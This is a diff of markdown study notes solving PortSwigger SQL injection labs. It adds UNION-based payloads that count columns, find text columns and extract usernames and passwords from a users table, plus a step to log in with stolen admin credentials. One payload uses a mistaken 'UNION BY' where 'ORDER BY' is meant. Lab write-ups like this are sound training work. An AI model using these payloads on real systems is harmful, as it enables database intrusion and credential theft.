@@ -47,12 +47,12 @@
 - Second, Determine a column that is compatible with string data. 
 
 - Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
-- Modified: `SELECT * FROM products WHERE category = 'Gifts' UNION BY 4--` (Server Error, means number of columns = 3)
+- Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+BY+4--` (Server Error, means number of columns = 3)
 - Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+'a',NULL,NULL--` (Server Error, means this column accepting text value)
 - Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,NULL,'a'--` (Server Error, means this column accepting text value)
 - Modified: `SELECT * FROM products WHERE category = 'Gifts'+UNION+SELECT+NULL,'a',NULL--` ('a' determine that the 2nd column accepting text value)
 
-## Lab 6: SQL injection UNION attack, retrieving data from other tables [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#)
+## Lab 6: SQL injection UNION attack, `retrieving data from other tables` [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-using-a-sql-injection-union-attack-to-retrieve-interesting-data/sql-injection/union-attacks/lab-retrieve-data-from-other-tables#)
 
 - Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
 - Modified: `SELECT * FROM products WHERE category = 'Gifts'UNION+SELECT+username,password+FROM+users--` This should return all the users available in USERS table. (Since, table and columns name were given in Lab description. We can take it from there)
@@ -60,7 +60,21 @@
 - ![image](https://github.com/user-attachments/assets/003e7533-e7c9-401d-824d-fe7c7a34fe98)
 
 
-## Lab 7: [Link]()
+## Lab 7: SQL injection UNION attack, retrieving multiple values in a single column [Link](https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-multiple-values-within-a-single-column/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
+
+- Original Query: `SELECT * FROM products WHERE category = 'Gifts'`
+- Modified:
+```
+'Union+select+Null,NULL-- To determine the No. of columns
+'Union+select+Null,'XYZ'-- To determine which column allows TEXT values
+'Union+select+Null,username+from+users-- To retrieve Single TEXT value
+'Union+select+Null,password+from+users-- To retrieve Single TEXT value
+'Union+select+Null,username||password+from+users-- To retrieve Multiple TEXT value
+'Union+select+Null,username||'~'||password+from+users-- To retrieve Multiple TEXT value with separator
+```
+- Login with Admin Creds to Solve the LAb
+- ![image](https://github.com/user-attachments/assets/d73f2473-adfa-4ba2-beac-dfc914e9e354)
 
 
+## Lab 8: [Link]()
 
